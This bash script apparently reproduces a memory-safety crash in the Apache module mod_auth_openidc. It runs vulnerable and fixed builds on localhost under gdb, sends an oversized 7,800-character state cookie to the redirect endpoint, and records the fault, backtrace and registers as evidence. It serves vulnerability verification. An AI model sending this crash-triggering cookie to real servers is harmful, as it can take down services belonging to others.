#!/usr/bin/env bash
# W19: observe-only gdb capture of a native fault on the response caller
# (handle/response.c:353). Same non-ASan system stack as W16, config and URL
# switched to the redirect callback. ASLR on; no shim/preload/ASAN_OPTIONS.
# A failure to fault under gdb is a negative result, not forced execution.
set -u
HERE="$(cd "$(dirname "$0")" && pwd)"
HTTPD=/usr/sbin/apache2
VCONF="$HERE/httpd-sys-response.conf";       VERR="$HERE/error-sys-response.log"
FCONF="$HERE/httpd-sys-response-fixed.conf"; FERR="$HERE/error-sys-response-fixed.log"
URL='http://127.0.0.1:18091/redirect_uri?code=foo&state=foo'
OUT="$HERE/evidence/sys-response-gdb"
mkdir -p "$OUT"
export LD_LIBRARY_PATH="$HERE/plain-prefix/lib"
PAD=$(printf 'a%.0s' $(seq 1 7800))

stop() {
  "$HTTPD" -f "$VCONF" -k stop >/dev/null 2>&1 || true
  "$HTTPD" -f "$FCONF" -k stop >/dev/null 2>&1 || true
  pkill -f "$VCONF" >/dev/null 2>&1 || true
  pkill -f "$FCONF" >/dev/null 2>&1 || true
  sleep 2
}
trap stop EXIT

probe() {
  label="$1" conf="$2" err="$3" cookie="$4" starts="$5" n="$6"
  : > "$OUT/$label-summary.txt"
  for s in $(seq 1 "$starts"); do
    stop
    : > "$err"
    gdblog="$OUT/$label-$s-gdb.txt"; codes="$OUT/$label-$s-codes.txt"; : > "$codes"
    timeout 80 gdb -q -batch \
      -ex 'set pagination off' -ex 'set confirm off' \
      -ex 'set disable-randomization off' \
      -ex 'set follow-fork-mode child' -ex 'set detach-on-fork on' \
      -ex 'handle SIGSEGV stop print nopass' \
      -ex "run -f $conf -DFOREGROUND" \
      -ex 'printf "\nSTOP_PC=%p\n", $pc' \
      -ex 'bt 24' \
      -ex 'info registers rip rsp rax rbx rcx rdx rdi rsi' \
      -ex 'x/14i $pc' \
      -ex 'info proc mappings' \
      --args "$HTTPD" > "$gdblog" 2>&1 &
    gp=$!
    for i in $(seq 1 20); do
      ready=$(curl -sS --max-time 2 -o /dev/null -w '%{http_code}' "http://127.0.0.1:18091/protected" 2>/dev/null || true)
      [ "$ready" != "000" ] && break
      sleep 1
    done
    for i in $(seq 1 "$n"); do
      code=$(curl -sS --max-time 6 -o /dev/null -w '%{http_code}' \
        -H "Cookie: $cookie" "$URL" 2>/dev/null || echo CURLERR)
      echo "$i $code" >> "$codes"
      grep -q 'received signal SIGSEGV' "$gdblog" 2>/dev/null && break
      kill -0 "$gp" 2>/dev/null || break
    done
    sleep 2
    kill "$gp" >/dev/null 2>&1 || true
    wait "$gp" >/dev/null 2>&1 || true
    caught=$(grep -c 'received signal SIGSEGV' "$gdblog" || true)
    pc=$(grep 'STOP_PC=' "$gdblog" | tail -1 || true)
    printf '%s start=%s caught=%s %s codes=%s\n' \
      "$label" "$s" "$caught" "$pc" "$(tr '\n' ',' < "$codes")" \
      | tee -a "$OUT/$label-summary.txt"
    cp "$err" "$OUT/$label-$s-error.log"
  done
}
{
  echo "date: $(date -u +%FT%TZ)"
  echo "httpd: $(sha256sum "$HTTPD")"
  echo "vuln state.c: $(sha256sum "$HERE/src/mod_auth_openidc-sys/src/state.c")"
  echo "vuln module:  $(sha256sum "$HERE/src/mod_auth_openidc-sys/src/.libs/mod_auth_openidc.so")"
  echo "fixed module: $(sha256sum "$HERE/src/mod_auth_openidc-sys-fixed/src/.libs/mod_auth_openidc.so")"
  echo "gdb: $(gdb --version | sed -n 1p)"
} > "$OUT/summary.txt"

probe vuln_bare_7800  "$VCONF" "$VERR" "mod_auth_openidc_state_$PAD" 3 8
probe fixed_bare_7800 "$FCONF" "$FERR" "mod_auth_openidc_state_$PAD" 1 6
cat "$OUT/summary.txt"
